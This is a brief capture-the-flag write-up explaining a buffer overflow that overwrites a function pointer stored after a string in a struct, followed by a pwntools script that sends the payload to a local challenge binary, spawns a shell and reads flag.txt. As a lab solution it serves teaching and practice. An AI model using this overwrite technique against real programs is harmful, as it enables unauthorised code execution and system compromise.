# ðŸ”‘ Write-Up

By looking at the source we can see that there's a struct containing a string followed by a function pointer, if we can somehow overflow the string buffer we can jump to an arbitrary location. One interesting destination might be the last line of the `bash` function which happens to have an offset of `0x32` from the start of the function. The user input handling doesn't check string bounds so we can easily overflow the buffer and pop a shell.

```python
from pwn import *

context.binary = "./java"

p = process()
p.sendline(b"java" + b"A" * 28 + p64(context.binary.functions["bash"].address + 0x32))
p.sendline(b"cat flag.txt")
log.success(p.recvline_regex(rb".*{.*}.*").decode("ascii"))
```
